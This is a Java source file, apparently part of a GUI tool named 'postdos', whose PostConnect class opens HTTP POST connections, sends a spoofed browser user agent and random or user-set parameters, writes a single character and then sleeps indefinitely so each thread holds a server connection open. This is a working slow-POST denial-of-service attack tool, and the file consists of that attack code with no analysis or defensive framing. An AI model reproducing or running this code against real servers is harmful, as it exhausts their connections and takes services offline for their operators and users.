/**
 * 
 */
package vn.kist.postdos;

import java.io.DataOutputStream;
import java.io.IOException;
import java.net.HttpURLConnection;
import java.net.ProtocolException;
import java.net.URL;
import java.util.Random;

/**
 * @author Kobe
 *
 */
public class PostConnect implements Runnable{
	
	private static String host, param;
	private URL url;
	private HttpURLConnection con;
	private DataOutputStream wr;
	private StringBuilder paramBuild;
	private Random ran;
	
	
	public PostConnect() throws Exception{

	}
	
	public void start() throws Exception {
		setHeaders();
		sendRequests();
	}
	
	
	public void createConnection() throws Exception{
		con = (HttpURLConnection) url.openConnection();
	}
	
	public void setHeaders() {
		
		try {
			getCon().setRequestMethod("POST");
		} catch (ProtocolException e) {
			PostGui.setConsoleLog("[-] Exception: " + e);
		}
		getCon().setRequestProperty("User-Agent", "Mozilla/5.0");
		getCon().setRequestProperty("Accept-Language", "en-US,en;q=0.5");
		getCon().setDoOutput(true);
		
		if(PostGui.isRandom()) {
			setParam(genParam());
		} else {
			setParam(PostGui.getParam());
		}
		
	}
	
	public void sendRequests() {
		
		try {
			wr = new DataOutputStream(getCon().getOutputStream());
		
			PostGui.setConsoleLog("[+] #" + Thread.currentThread().getName() + " sending...\r\n");
			for (int foo = 0; foo < param.length(); foo++) {
				wr.writeChar(param.charAt(foo));
				Thread.sleep(Long.MAX_VALUE);
			}
		} catch (Exception e) {
			PostGui.setConsoleLog("[-] Exception: " + e);
		}
	}
	
	public String genParam() {
		
		paramBuild = new StringBuilder();
		
		paramBuild.delete(0, paramBuild.length());
		
		ran = new Random();
		
		for (int count_1 = 0; count_1 < 2; count_1++) {
			for(int count_2 = 0; count_2 < 10; count_2++) {
				paramBuild.append(ran.nextInt());
				
				if (count_2 == 5)
					paramBuild.append(":");
			}
			
			paramBuild.append("&");
		}
		
		return paramBuild.toString();
	}
	
	public void closeConnection() {
		getCon().disconnect();
	}

	public HttpURLConnection getCon() {
		return this.con;
	}
	
	public URL getUrl() {
		return url;
	}

	public void setUrl(URL url) {
		this.url = url;
	}

	/**
	 * @return the host
	 */
	public static String getHost() {
		return host;
	}

	/**
	 * @param host the host to set
	 */
	public static void setHost(String host) {
		PostConnect.host = host;
	}

	/**
	 * @return the wr
	 */
	public DataOutputStream getWr() {
		return wr;
	}

	/**
	 * @param wr the wr to set
	 */
	public void setWr(DataOutputStream wr) {
		this.wr = wr;
	}

	/**
	 * @return the param
	 */
	public static String getParam() {
		return param;
	}

	/**
	 * @param param the param to set
	 */
	public static void setParam(String param) {
		PostConnect.param = param;
	}

	@Override
	public void run() {
		try {
			start();
		} catch (Exception e) {
			// TODO Auto-generated catch block
			e.printStackTrace();
		}
		
	}

}
